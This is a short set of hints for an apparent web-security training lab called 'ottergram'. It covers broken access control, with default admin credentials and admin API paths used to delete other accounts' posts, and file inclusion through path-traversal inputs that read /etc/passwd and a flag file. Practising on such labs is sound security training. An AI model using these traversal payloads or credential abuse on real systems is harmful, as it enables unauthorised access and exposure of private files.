* Hint : **Broken access control.** : Lab variant: ottergram-002

  * Given admin credentials `admin:admin123`
  * admin can flag a post `/api/posts/1/flag`; You can Mark as Ok `/api/admin/posts/1/approve`; You can Delete Post `/api/admin/posts/1`;
  * Create another account; and Delete post of other accounts; `DELETE`
    ```text
    /api/admin/posts/2
    ```


* Hint : **File inclusion** : Lab variant: ottergram-003

  * Inside profile posts `/api/post/image?file=/uploads/otter1.png`
  * In file `/api/post/image?file=../../../etc/passwd`
  * `/api/post/image?file=../flag.txt`


